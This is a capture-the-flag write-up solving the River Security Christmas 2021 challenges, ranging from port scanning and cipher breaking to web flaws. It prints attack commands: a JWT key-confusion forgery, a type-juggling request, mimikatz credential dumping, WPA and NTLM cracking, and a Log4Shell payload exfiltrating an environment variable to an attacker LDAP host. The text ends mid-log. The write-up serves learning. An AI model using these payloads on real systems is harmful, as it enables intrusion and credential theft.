## Day 1

```
The search

Welcome to the River Security XMas Challenge (RSXC)! RSXC operates with the following flag format for most challenges 'RSXC{flag}'. If another flag format is used, the challenge text will mention this.

In this first challenge we have managed to forget which port we are listening on. Could you please find the port listening for traffic? We know it's in the range 30 000-31 000.
```

Easily found with nmap:

```bash
$ nmap -p30000-31000 rsxc.no
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-02 09:00 Eur
Nmap scan report for rsxc.no (134.209.137.128)
Host is up (0.035s latency).
Not shown: 1000 closed ports
PORT      STATE SERVICE
30780/tcp open  unknown
```

Connecting to that port yields the flag

```
$ nc rsxc.no 30780
RSXC{Congrats!You_found_the_secret_port_I_was_trying_to_hide!}
```



## Day 2

```
A magic word

We have found a magical port that is listening on port 20002, maybe you can find todays flag there?
rsxc.no:20002
```

Connecting to the port, and sending some data, prints `That is not the byte I want!`. Assuming that they receive a single byte, and they want a specific one, it's possible to simply try all the possibilities.

```python
from pwn import *

context.log_level = "warning"

for i in range(256):
    r = remote("rsxc.no", 20002)
    r.send(bytes([i]))
    print(i, r.recvall())
    r.close()
```

After a while, the flag is printed

`212 b'RSXC{You_found_the_magic_byte_I_wanted_Good_job!}'`, meaning `0xd4` was the byte they wanted.



## Day 3

A URL is given `https://rsxc.no/274d11760e75cfd2c5f6a8a1198a6c19ddee702a8b7e26102e8e48f0212cc278/03-challenge.txt`

and it contains the long text string

```
ZlhTWk5KQTV6d3JuVzNpQnFyeGl5cXNkSEdBelZWVkdOMVVXRkQzVG5XQjhSSlBxU3VVQjNvVGZlTjJmdll0ZnVDazRyRzk0SzRYSzUxdzlwZktTY1pqMTdBeXNKa0ZWZVpGdXV6Snh1YmF0OWRORWJBbVNGU0RBeDhvdkZGTjh5VG44WnhKUjU2THZ6NFU1dVloeTExaEVEZzRlSGlTS29EWnJvNTVWTng3NUN4RWJwRnRnOUdDZVR2dEtCVldKajVWOFRwOFIzUXI4WmhRVEhON3BGQXM4NWdoMXNzNUxXcXplUW5kTVdnenliaHgxRFU0RlczNXBTU2drdkVtYjc2dnE2TDlzeERYQXpTcXoxNzFOMkZmZ1M4aGdmZFY4VmpnQWlIc1I3ZjU2ZjdBc2h2cFZwdmZmOVd0VUZnSjJFRVBXeENCeFVHOXRQVFpjYTlFUXczaFJUd1M0RlZlTE1TUHNCdXpKWTdxU043cEs5bTlKNWs3cTRNaWI2Ym1Lem9uYXk1bUVNeXJtYVNVNFVnWm9VeG9KdkRrVkhS
```

which is easily recognized as base64. Decoding it, gives something that still looks like base64, but has a different charset. Time to throw it into CyberChef, as the "magic wand" can recognize a lot of formats. It quickly identifies base64 -> base58 -> bzip2 decompress. Then it needs some help to recognize base85, but from there it is easily able to automatically recognize Morse Code -> Hex Decode -> Base32 and the flag pops out. The final recipe looks like this:

```
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true)From_Base58('rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz',false)Bzip2_Decompress(false)From_Base85('!-u')From_Morse_Code('Space','Line%20feed')From_Hex('None')From_Base32('A-Z2-7%3D',false)&input=WmxoVFdrNUtRVFY2ZDNKdVZ6TnBRbkZ5ZUdsNWNYTmtTRWRCZWxaV1ZrZE9NVlZYUmtRelZHNVhRamhTU2xCeFUzVlZRak52VkdabFRqSm1kbGwwWm5WRGF6UnlSemswU3pSWVN6VXhkemx3Wmt0VFkxcHFNVGRCZVhOS2EwWldaVnBHZFhWNlNuaDFZbUYwT1dST1JXSkJiVk5HVTBSQmVEaHZka1pHVGpoNVZHNDRXbmhLVWpVMlRIWjZORlUxZFZsb2VURXhhRVZFWnpSbFNHbFRTMjlFV25Kdk5UVldUbmczTlVONFJXSndSblJuT1VkRFpWUjJkRXRDVmxkS2FqVldPRlJ3T0ZJelVYSTRXbWhSVkVoT04zQkdRWE00Tldkb01YTnpOVXhYY1hwbFVXNWtUVmRuZW5saWFIZ3hSRlUwUmxjek5YQlRVMmRyZGtWdFlqYzJkbkUyVERsemVFUllRWHBUY1hveE56Rk9Na1ptWjFNNGFHZG1aRlk0Vm1wblFXbEljMUkzWmpVMlpqZEJjMmgyY0Zad2RtWm1PVmQwVlVablNqSkZSVkJYZUVOQ2VGVkhPWFJRVkZwallUbEZVWGN6YUZKVWQxTTBSbFpsVEUxVFVITkNkWHBLV1RkeFUwNDNjRXM1YlRsS05XczNjVFJOYVdJMlltMUxlbTl1WVhrMWJVVk5lWEp0WVZOVk5GVm5XbTlWZUc5S2RrUnJWa2hTCg
```

And the output is the flag;

`RSXC{I_hope_you_used_cyber_chef_it_does_make_it_alot_easier}`



## Day 4

```
4 Bytes of XOR

The flag of the day can be found by xor'ing our text with 4 bytes.
```

This output is given, and it looks like many hexbytes mashed together.

`0xda0x960x0c0x960xf30x880x3b0xa60xfc0x9a0x230xba0xfd0xa90x300x8a0xfb0xa40x2d0x8a0xd00x8a0x060x8a0xe10xb60x3a0xf20xfc0x9a0x200xbd0xe90xb10x0b0xa00xfb0xa00x320xa00xe40x9a0x350xbb0xf10xa80x3b0xa70xed0xb8`

First step is to convert this to something that's easier to work with

```python
>>> bytes(int(e,16) for e in enc.strip("0x").split("0x"))
b'\xda\x96\x0c\x96\xf3\x88;\xa6\xfc\x9a#\xba\xfd\xa90\x8a\xfb\xa4-\x8a\xd0\x8a\x06\x8a\xe1\xb6:\xf2\xfc\x9a \xbd\xe9\xb1\x0b\xa0\xfb\xa02\xa0\xe4\x9a5\xbb\xf1\xa8;\xa7\xed\xb8'
```

The key is 4 bytes, and knowing the flag format it is possible to deduce the key easily.

```python
>>> key = bxor(b"RSXC", enc)
>>> bxor(enc, key*len(enc))
b"RSXC{Most_would_say_XOR_isn't_that_useful_anymore}"
```

Flag is `RSXC{Most_would_say_XOR_isn't_that_useful_anymore}`



## Day 5

```
Plain discussion

A spy was listening in on some of our discussion about todays challenge. Can you figure out what he found? 
```

A PCAP file is given, and inside it there is a few things.

Firstly, there's an IRC log

```
WHO #channel
:irc.example.com 352 simen #channel ubuntu 172.17.0.1 irc.example.com simen H :0 ubuntu
:irc.example.com 352 simen #channel ubuntu 172.17.0.1 irc.example.com chris H@ :0 ubuntu
:irc.example.com 315 simen #channel :End of /WHO list.
MODE #channel b
:irc.example.com 368 simen #channel :End of channel ban list
PRIVMSG chris :Hey!
PRIVMSG #channel :Hey, got any suggestions for the challenge? Any way we can make it harder to get the flag?
PING irc.example.com
:irc.example.com PONG irc.example.com :irc.example.com
:chris!ubuntu@172.17.0.1 PRIVMSG #channel :What about encrypting a zip file containing the flag? Let's say a 10 digit long number above 9 954 000 000 as the password?
PRIVMSG #channel :Sound like a great idea! I will get right too it!
QUIT :leaving
ERROR :Closing link: (ubuntu@172.17.0.1) [Quit: leaving]
```

Meaning there's a password that is 10 digits long, and larger then 9954000000.

Next up is an FTP transfer

```
220 Welcome Alpine ftp server https://hub.docker.com/r/delfer/alpine-ftp-server/
USER simen
331 Please specify the password.
PASS password
230 Login successful.
SYST
215 UNIX Type: L8
TYPE I
200 Switching to Binary mode.
PASV
227 Entering Passive Mode (172,17,0,2,82,9).
STOR ./flag.zip
```

The actual file is sent over a different connection, and can be saved from Wireshark by saving tcp stream 6 as "raw" to the hard drive. Now there's a `flag.zip` with password protection. Time to break it.

```
zip2john.exe flag.zip > hashes.txt
# Modify hash file a bit, removing prefix/suffix so hashcat is happy
hashcat.exe -a 3 -m 17200 5-pw.txt hashes.txt 99?d?d?d?d?d?d?d?d
```

After a few seconds, the password pops out as `9954359864` and the flag is retrievable.

`RSXC{Good_job_analyzing_the_pcap_did_you_see_the_hint?}`



## Day 6

```
We recently did some research on some old ciphers, and found one that supposedly was indecipherable, but maybe you can prove them wrong?
```

The following ciphertext is given

`PEWJ{oqfgpylasqaqfzmgloxjgcezyigbglx}`

Since the flag format is `RSXC{...}` we can start to look at the differences between each letter. `R->P` is -2, `S->E` is +12 (assuming English alphabet), etc. So it's not just a ROT cipher, or monoalphabetic substitution at all. It's supposedly an old cipher, so probably something like Vigénere (or can be approached like Vigénere).

We know the start has to be "RSXC", so the key has to start with "YMZH" for the ciphertext to decode into that. Adding another letter to it, gives something like `RSXC{osthiynotjastafgncycgesariiphex}` which looks almost legible, meaning the length of the key is probably 5 indeed. Testing a few more letters until it makes sense, and the final key is `YMZHG` and the flag is 

`RSXC{isthisnotjustafancycaesarcipher}`

The key makes it seem like this was not the intended path, but many similar ciphers can be solved as if it was Vigénere.



## Day 7

```
This is quite meta

We found this picture that seemed to contain the flag, but it seems like it has been cropped, are you able to help us retrieve the flag?
```

The following image is given

![07-challenge](07-challenge.jpg)

So the image has been cut off. I try to increase the height of the image, to see if the data is still there, but there's nothing there. I then inspect the EXIF metadata, and see that the file includes a thumbnail. I extract this using `exiftool -b 07-challenge.jpg` and trim away the non-image metadata in the start of the file.



![07-thumb](07-thumb.jpg)

Flag is

`RSXC{Sometimes_metadata_hides_stuff}`



## Day 8

```
The reference

I just created a new note saving application, there is still some improvements that can be made but I still decided to show it to you!
http://rsxc.no:20008
```

The website links to URLs like `/notes.php?id=2` for ids 2, 3 and 4. Testing earlier ids, in case of an IDOR vulnerability, this shows up at message id 1:
`Today I learned an interesting fact!    When computers count, they start at 0.`

At id=0 the flag can be found

```
Flag

My flag is RSXC{Remember_to_secure_your_direct_object_references}
```



## Day 9

```
The reference 2

I see that someone managed to read my personal notes yesterday, so I have improved the security! Good luck!
http://rsxc.no:20009
```

This app looks exactly the same as Day 8, except the main page says 
`Someone managed to bypass my security.  I have therefor implemented the functionality in RFC 1321 to help secure me`.

`RFC 1321` is the specification for MD5 digests, a function for hashing data. The link to `note1` now doesn't link to `/notes.php?id=1` like before, but `notes.php?id=d6089d6c1295ad5fb7d7ae771c0ad821`. Googling this hash, shows that it's the MD5 hash for "note1". I try to make a hash for note0.

```bash
$ echo -n note0 | md5sum
65b29a77142a5c237d7b21c005b72157 *-
```

and then the website shows

```
Hidden the flag

I have now hidden the flag with a custom naming convention. I just have to remember that the input to the md5sum for it is all lower case and 4 characters long. (Hint: no need to bruteforce...) 
```

I totally started bruteforcing this before they added the hint, but stopped it when I remembered that the word "flag" matches the description.

```bash
$ echo -n flag | md5sum
327a6c4304ad5938eaf0efb6cc3e53dc *-
```

And at `http://rsxc.no:20009/notes.php?id=327a6c4304ad5938eaf0efb6cc3e53dc` the flag is found:

```
Flag

My flag is RSXC{MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext}
```



## Day 10

```
Lookup

Sometimes you need to look up to get the answer you need.
http://rsxc.no:20010
```

Trying a few values on the website always yields `Could not find what you searched for!`

Let's inspect the headers

```
$ curl -I http://rsxc.no:20010
HTTP/1.1 200 OK
Date: Sat, 11 Dec 2021 00:09:41 GMT
Server: Apache/2.4.51 (Debian)
X-Powered-By: PHP/7.4.26
Flag: RSXC{Sometimes_headers_can_tell_you_something_useful}
Content-Type: text/html; charset=UTF-8
```

Flag is `RSXC{Sometimes_headers_can_tell_you_something_useful}`



## Day 11

```
The not so random prime

We intercepted some traffic from a malicious actor. They seemed to be using a not so secure implementation of RSA, could you help us figure out how they did it?
https://rsxc.no/af6c1a2345b4de89831605d6c9cd9307b6b54df0bd6bd8c506317277119457e8/11-challenge.zip
```

There's some RSA code that picks primes like this

```python
p = randprime(2**1023, 2**1024)
q = nextprime(p*p)
n = p*q
```

Since prime gaps are pretty small, n will be very close to `p^3`. It's possible to take the cube root of `n`, then search for factors close to that value. This nets `p` very quickly, and `q = n//p`. Thus is the system broken. Implementation as follows:

```python
from gmpy2 import invert, iroot
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from math import gcd
import base64

enc = base64.b64decode("MybmIUY2CCSU7M6ojf6PjIXcECMBRgJRH1n1U15dB7L5VXgD4uC8Ry3U+isYpLlhEkw3HjmCTMjPM1trqON1eoV/ZGhtfQvK/iy/FdyAPmV6ykLofWBqFViMGtWebYRYqqKubbMux4aupS4uu2ppR+VIjqOBDuiMwqxvRzxGcRsc7vMGhi6F8qfBuiD+V1Kfe9MhhU1vxNb8a745qLSRc8wjIYQ4a4lPqy0H3dBPuoT3clR9A0dTvQsTq5kfUGBC072ij2RFpBBW9d2qj+KihLapaH6I1ZyZmmBFl83+Qb5QbM0RBB/wAfOKfZ3lfPoRpEjST9MX/J/RBvlaCPaqpkApNCr5bV/6rqxs+paN08bkvdQ5tapcSWR9jXuw+mY1RzS9sb7rbaBoVdwArEUyJwlUBoLiNxkE6w6NPgKpNpmQ08Tm8b1PK2CAs6TW9e6JphwpZlsy76BSpEJgFHLpeqNxmgAY1ESGfCx9soiv9KSPYMvDkm4JbmtH7GHqslzB")

n = 1415732912633110850463082290910531310944025185851628960496687559483254746929720221647023240242336158686917844098726955123922281990353849950572386591304198809887980195592164437463694396551629025725893297740721210740603852117845187276240822110209890805395726319272811238182117091397934074647625229734002195089686974969651954470535554347943901878883362518072923354248859147416112318206824337487445716704648503565676180267966061851236231329358955557146660099270996351905681299543490284088388917086359028800783355214649085181453134992031245774041645632697445995388906670744100784647364712047823965135210709248854353892069782338755245211910680179291304283133858067808724881428158118018329116480623919406482183591009161012049808848921597384462762413755053792928218673793301012582611446447895722794852586858407955308203712823698883371297395149325161872495891941488144882598336487422503139931872453298083167787506759793770112004781589
e=65537

s = iroot(n, 3)[0]
p = max(gcd(n, s+i) for i in range(-1000, 1000))
q = n//p
d = int(invert(e, (p-1)*(q-1)))
key = RSA.construct((n,e,d,p,q))
rsa = PKCS1_OAEP.new(key)

print(rsa.decrypt(enc))
```

`RSXC{Good_Job!I_see_you_know_how_to_do_some_math_and_how_rsa_works}`



## Day 12

```
Twelve seconds of encoding

For this challenge you need to do some encoding, but remember, you need to do it quickly, before the time runs out.
rsxc.no:20012
```

Connecting to the remote gives a variety of tasks to accomplish, and there is a timer to make sure it is automated. This script parses the data and solves the challenges.

```python
from pwn import *
import base64
import re


r = remote("rsxc.no", 20012)
_ = r.recvline()

for _ in range(101):
    chall = r.recvlineS().strip()
    print(chall)
    if (m:=re.findall("^Please turn this to lower case for me: ([A-Z]+)$", chall)):
        r.sendline(m[0].lower().encode())
    elif (m:=re.findall("^Please reverse this string for me: (.*)$", chall)):
        r.sendline(m[0][::-1].encode())
    elif (m:=re.findall("^Please base64 decode this for me: (.*)$", chall)):
        r.sendline(base64.b64decode(m[0]))
    elif (m:=re.findall("^Can you please hex decode this for me: (.*)$", chall)):
        r.sendline(bytes.fromhex(m[0]))
    else:
        assert False

print(r.recvlineS())
```

At the end, the flag is printed `RSXC{Seems_like_you_have_a_knack_for_encoding_and_talking_to_servers!}`



## Day 13

```
New technology is hard

When starting with new languages and frameworks, it is easy to get confused, and do things you shouldn't.
http://rsxc.no:20013
```

The URL points to a note-taking website, but the app is only local, with the notes being stored in localstorage. But the entire app has source maps, and we can look at the code for `Todos.js` by browsing these, e.g. in Chrome developer tools

```js
import React from 'react'

export default function Todos() {
  const b64 = "UlNYQ3tpdF9taWdodF9iZV90aGVyZV9ldmVuX2lmX3lvdV9kb24ndF9pbmNsdWRlX2l0IX0="
  return (
    <div>
      <p>Hide this somewhere, and not just rely on base64: {b64}</p>
    </div>
  )
}

```

This blob decodes into
`RSXC{it_might_be_there_even_if_you_don't_include_it!}`



## Day 14

```
JWT

Have you heard about the secure information sharing standard JWT? It can sometimes be a little confusing, but I think we got it all figured out.
http://rsxc.no:20014
```

This website provides a login form, and the following credentials are listed below:

```
Test user account:
test:test

Admin account:
admin:REDACTED
```

Logging in as `test` gives a JWT token cookie that's rather long, and redirects to `portal.php`.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.GU72t7mfy31jMvyY7hSinJBtAntSqjeuqJa6el2PGPaq36hkZtn8fVo8JEgv7hnEdOHkibVLz9MLUca12yLmbylSxl-Nh2_pMf2s03JBsKs7oIJeBKjj7Pw4lXp1TQQj6ISTwzeBNAUlv4VXJ11G-mPFKwYxTOQg7IX0FxyGMlGbLKoe3TXbw7trXwXevC9O_q_cxHRFMINg9vPAATKI0_PfMJPGBdewILLf1aExd37QhTUts8IE11ak3To8TDnQZ14h14evccnWfVp8sQOFo81Rlp5r1j3WBQnaEsYhVMKuBgW2osceqgFG8ABIYj8eF7vtRzaJUMTVe_dUk0x43A8Meb5Xe2TdyIOkhoQPHTZ3BYxLX4pW_yrjjPSAWSfCAEm07fqYc4tP7IXvZ7rtlGwq_eMoBotGj8KJAI1FqAc1kh6fC0KdQvvAY2XhifJZArCpXsRiyoSdjB5oJVeDlsjyQ4HUcgfn8Yn0sEdC6tqyATIAMMWaGMDb54Iw0NX7F4P2VrCeZ75A3K-patffZFxyssqeS-rMYkbn8O7lXfaxoe8us-IKN5wCwNBp82CSU0qR8U2iWU4Or22kNBRFuVV5sr2huMkIf1dodVmpodAExfiwEs28DCkKf9y5uV6fHJohX1Bo31JdghbsgPufM_z3GD1HSfBaMUpUSO6vJME
```

There's no notes stored for the test user, so the goal is to become admin.

JSON Web Tokens (JWT) is a way for a web application to deal with session management by making the user store the data, together with a signature or hmac. When the user sends a token to the server, the server is able to verify the signatures and see that it originated from itself. The token is made up of 3 parts, split by `.`, and each urlsafe base64-encoded. The first is a header, telling the type of algorithm used. The second is the data, which can optionally be encrypted. The last part is the signature itself.

This token is signed with the `RS256` algorithm, and the public key is linked to on the website (`jwtRS256.key.pub`). Testing some JWT attacks like omitting signature, setting "alg" to "none" etc. doesn't work. So the solution is likely related to the hint in the description, where it mentions "confusing". There is a key confusion attack in JWT, where you can swap from RS256 (signed with private key, verified with public key) to HS256 (signed with public key, verified with private key). There is a tool that does the dirty job for us, because e.g. Python libraries will straight up refuse to sign with public keys, citing the aforementioned vulnerability. Instead of changing the libraries, it's easier to use `jwt_tool` for this job.

The goal is to change the username from "test" to "admin", and make the resulting JWT valid.

```
$ jwt_tool.py -pc username -I -pv admin -X k -pk jwtRS256.key.pub "JWT_TOKEN_HERE"

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi

Original JWT:

File loaded: jwtRS256.key.pub
jwttool_8ca029d72cfdcf13e7c8399b22db9030 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.gERmL-_S0FkZDAbIE6zrYSIP2MKc3Mrh5jxOWkM8Gyw
```

Providing this JWT as a cookie, instead of the one given earlier, nets a flag:

`RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}`



## Day 16

```
A scary command

Sometimes while monitoring networks and machines, or doing incident response, we find some obfuscated commands. We didn't have time to deobfuscate this, and it is not recommended to just run it. Could you help us with it?
https://rsxc.no/dfb61488866658d31e3e7ccd2287caf233108a7eb917da6aefde3792d0fd79d2/16-challenge.sh
```

This script contains slightly obfuscated strings, which are pieced together and evaluated. It's easy to defang it by replacing the `eval` statements with `echo`, and making sure there's no evaluation characters like "\`" or `${}` inside it.

A few layers in, and the format changes slightly

```
echo 0x206375726c20687474703a2f2f727378632e6e6f2f623630623334643261666364346233393530653463363334316566626331306364623730653738326337306232626638393530653330356164393065626435662f666c61672e7478743b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d3b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d0a | xxd -r -p | sh
```

The final command is

```
curl http://rsxc.no/b60b34d2afcd4b3950e4c6341efbc10cdb70e782c70b2bf8950e305ad90ebd5f/flag.txt;#UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ==;#UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ==
```

Where the last two strings are base64-encoded flags:
`RSXC{Don't_blindly_trust_obfuscated_code_it_might_do_something_bad}`



## Day 17

```
My XMas card

We felt like it's time to start sending out some XMas cards, maybe you find something you like?
http://rsxc.no:20017
```

Visiting the website, there's a message `Finding your card in /files` followed by some ASCII art. Visiting `/files/` shows 3 files:

- `card.txt`, which contains the ASCII art
- `flag.txt`, which is unreadable
- `index.php-1`, supposedly the source of the main page

```php
<?php
header('Content-Type: text/plain');
class Card{
    public $file = "card.txt";
    function __construct() {
    }

    function displayCard(){
      $this->file = __DIR__. "/files/".$this->file;
      if(substr(realpath($this->file),0,strlen(__DIR__)) == __DIR__){
	echo("Finding your card in /files")
        echo(file_get_contents($this->file,true));
      } else {
        echo "NO ðŸ˜ ";
      }

    }
}
if(isset($_GET['card']) && !empty($_GET['card'])){
  $card = unserialize(base64_decode($_GET['card']));
} else {
  $card = new Card;
  $card->file = 'files/card.txt';
}

$card->displayCard();
```

The code is defining a class type called `Card`, and checks if there is a non-empty GET parameter called `card`. If there is, it will base64-decode it, unserialize it, and finally call its `displayCard` function. Otherwise, it will initialize a new Card object with `files/card.txt` as its file, and then call `displayCard`on that. There's some bugs in the script, like the fact that `/files/` is prepended to the string, and some missing semicolon, but otherwise it's pretty clear what the intention is.

The goal is likely to just serialize a class that reads `files/flag.txt`, and thus has `flag.txt` as its file param.

```php
<?php
class Card{
    public $file = "flag.txt";
}

echo base64_encode(serialize(new Card));
```

Visiting `http://rsxc.no:20017/?card=Tzo0OiJDYXJkIjoxOntzOjQ6ImZpbGUiO3M6ODoiZmxhZy50eHQiO30=`

gives a flag `RSXC{Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted}`



## Day 18

```
Remember the flag? Docker remembers

We found a docker image, but it seems that the flag has been removed from it, could you help us get it back?
https://rsxc.no/798d1de7d544fe090786f5930d137b863ff46dd19a018882ed2812a835517d1b/18-challenge.zip
```

The zip contains a docker image stored with `docker save`, which packs every layer as a separate archive, and produces some metadata to boot. The data describes the order to apply the layers, and how much it should overwrite of files etc.

There's only 3 layers inside the zip. One is overwriting flag.txt with blank data, another contains a root-fs for Alpine Linux, and `9fe4b6808af55b1cba8de0e09b728d09f52480307744bed28e164167426f03b8` contains the flag file. It can easily be unpacked with an archive manager tool like 7-Zip.

`RSXC{Now_you_know_that_docker_images_are_like_onions.They_have_many_layers}`



## Day 19

```
The inclusive xmas cards

We felt that the our last xmas cards weren't that inclusive. So we made even more options, so everyone has one that fits them!
http://rsxc.no:20019
```

The website links to things like "Snowmen", which has the locator `card.php?card=c25vd21lbi50eHQ=`. It's easy to see that this is base64, and decodes to `snowmen.txt`. Trying to encode "flag.txt" in base64 yields this URL:

`http://rsxc.no:20019/card.php?card=ZmxhZy50eHQ=`

Which gives the flag

`RSXC{It_is_not_smart_to_let_people_include_whatever_they_want}`



## Day 20

```
Easy mistakes

When programming, it is easy to make simple mistakes, and some of them can have dire consequences.
http://rsxc.no:20020
```

The source code in api.php is apparently

```php
?php

$data = json_decode(file_get_contents('php://input'), true);

if(!isset($data['hmac']) || !isset($data['host'])) {
  header("HTTP/1.0 400 Bad Request");
  exit;
}
$secret = getenv("SECRET");
$flag = getenv("FLAG");

$hmac = hash_hmac($data["host"], $secret, "sha256");

if ($hmac != $data['hmac']){
  header("HTTP/1.0 403 Forbidden");
  exit;
}

echo $flag;
```

Notice that [the documentation for hash_hmac](https://www.php.net/manual/en/function.hash-hmac.php) says that the argument order should be like

```php
 hash_hmac(
    string $algo,
    string $data,
    string $key,
    bool $binary = false
): string
```

but here, it is completely wrong. Input data controls the algorithm used, the secret has become the data to hash, and the string `"sha256"` is used as the key. In addition to this, the last comparison uses `!=` instead of `!==`, which makes it vulnerable to type juggling.

Providing a non-existing algorithm makes `hash_hmac()`return `false`, which becomes `0` when compared loosely. Thus the comparison can be tricked like this.

```
$ curl "http://rsxc.no:20020/api.php" --data '{"hmac":0,"host":"lol"}'
RSXC{You_have_to_have_the_right_order_for_arguments!}
```



## Day 21

```
Nice memories

Note: The flag is the clear text password for river-security-xmas user.
On a IR mission we found that the threatactor dumped lsass file.
Can you rock our world and find the flag for us?
https://rsxc.no/35a2c6961adc6886665363b6f47c3a156356a91a4cf602416b250aa4daca4167/21-challenge.zip
```

The zip file contains `lsass.DMP`

There's a nice explanation on how you can dump the lsass process and inspect it [here on this website](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz), and as lsass is known to contain user credentials, it is possible to recover hashes or even plaintext passwords by using mimikatz.

```
mimikatz # sekurlsa::minidump lsass.DMP
Switch to MINIDUMP : 'lsass.DMP'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.DMP' file for minidump...

Authentication Id : 0 ; 1304254 (00000000:0013e6be)
Session           : Interactive from 2
User Name         : river-security-xmas
Domain            : DESKTOP-V1MQH3P
Logon Server      : WIN-QC6FTBKEEE9
Logon Time        : 12.11.2021 13:29:30
SID               : S-1-5-21-2640804858-4017698289-1413954960-1001
        msv :
         [00000003] Primary
         * Username : river-security-xmas
         * Domain   : DESKTOP-V1MQH3P
         * NTLM     : 7801ee9c5762bb027ee224d54cb8f62e
         * SHA1     : bebad302f8e64b59279c3a6747db0e076800d9ca
        tspkg :
        wdigest :
         * Username : river-security-xmas
         * Domain   : DESKTOP-V1MQH3P
         * Password : (null)
        kerberos :
         * Username : river-security-xmas
         * Domain   : DESKTOP-V1MQH3P
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO
```

The password is not present in its plaintext form, but we have the NTLM hash of the password, which is insanely fast to brute-force. There is also a hint with "rock our world", hinting to the famous rockyou.txt password list, which leaked from a website of the same name. hashcat makes quick work of this

`hashcat.exe -a 0 -m 1000 -w 1 "21-pass.txt" "21-hash.txt" "rockyou.txt"`

and out pops `alliwantforchristmasisyou`, which is the flag.



## Day 22

```
Wireless communication

We tried to find a new way of sending the flag, and this time it is even encrypted! Since we are nice we will even give you a hint. The password starts with S. Can you Rock our world?
https:///rsxc.no/5512383c4c02768617233eefdd4f79efe5dea9d08a850c8414644abf296845cf/22-challenge.cap
```

The pcap file contains encrypted communication over WiFi, to an AP named "Private". Later, it shows an deauthentication attack being done, which makes the client connect back and do the 4-way handshake procedure while being monitored. This is something that can be attacked offline, but requires guessing the key. "Rock" is given as a hint towards "rockyou.txt" again, so the password is likely in there somewhere. 

`Aircrack-ng` can solve this in some time, especially by knowing that the password starts with `S`. But hashcat is faster by a large margin. To make hashcat attack it, the handshake has to be extracted from the pcap into a format digestible for hashcat. This can be done using tools, like explained in the documentation for hashcat, but there's [a website](https://www.onlinehashcrack.com/tools-cap-to-hccapx-converter.php) that also does this, and there's no sensitive information to be lost here anyways.

`hashcat.exe -a 0 -m 2500 -w 1 "22.txt" "22.hccapx" "rockyou.txt"`

After less than a minute, it prints out `Santaclaws99` as the password. Now the data in the pcap can be decrypted.

`airdecap-ng.exe -p Santaclaws99 C:\CTF\river21\22-challenge.cap -e Private`

Inside `22-challenge-dec.cap` there is a a flag being sent over TCP:

`RSXC{WIFI_is_fun}`



## Day 23

```
Locating the location

We seem to have lost a file, can you please help us find it?
http://rsxc.no:20023
```

Visiting the website yields this text

```
Please help!

Hey! Can you please help me?

I have lost my flag.txt file in a subfolder on this server, but I can't find it again. I know that dirb has a small.txt wordlist which contains the directory. Thank you in advance!

P.s. directory listing is not enabled
```

`dirb`, or DirBuster, is a tool that brute-forces folder or file names based on wordlists or fuzzing rules. It has some default wordlists, and one of them is indeed called `small.txt`. Running that against the server yields only `/icons/`, but there is no `flag.txt` to be found inside it. Maybe it's further down? DirBuster also has a recursive option, and enabling that one quickly finds `/icons/small/`, but nothing more.

After manually scanning a bit, it seems like the website actually fakes a path to the flag, so there is no folder to find at all. One has to query the entire path to find the flag. When looking for `/$dirname/flag.txt` it quickly finds it at `http://rsxc.no:20023/logfile/flag.txt`

```
 Thank you for finding my flag!

RSXC{Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag} 
```



## Day 24

```
The watcher
We have found a service that watches our every step, are you able to figure out how we can read the FLAG from the environment? NB. Container will be restarted every 30 minutes.

http://rsxc.no:20024
```

The website only says `Be careful, I'm logging everything...` upon visit, which seems to hint to the very recent log4jv2 bug `Log4Shell` (CVE-2021-44228). Exploiting this one is very easy, especially for leaking environmental variables. It's known that the parameter is called `FLAG`, so that's what should be leaked.

Exploits for Log4Shell typically uses LDAP or RMI paths, with certain params evaluated like shell variables. In some circumstances, given that the correct gadgets are present, it is possible to elevate it from information leak to RCE. Here, environment leak is enough.

Start up an LDAP server, forwarding the correct ports:
`docker run -p 389:389 -p 636:636 osixia/openldap:1.5.0`

Then it's possible to abuse log4shell by injecting a payload in the User-Agent when visiting the website:
`curl -s rsxc.no:20024 -A '${jndi:ldap://VPS_IP/${env:FLAG:-:}}'`

Almost immediately, this log entry is seen on the LDAP server side

```
61c886a0 conn=1000 fd=12 ACCEPT from IP=167.99.210.86:41178 (IP=0.0.0.0:389)
61c886a0 conn=1000 op=0 BIND dn="" method=128
61c886a0 conn=1000 op=0 RESULT tag=97 err=0 text=
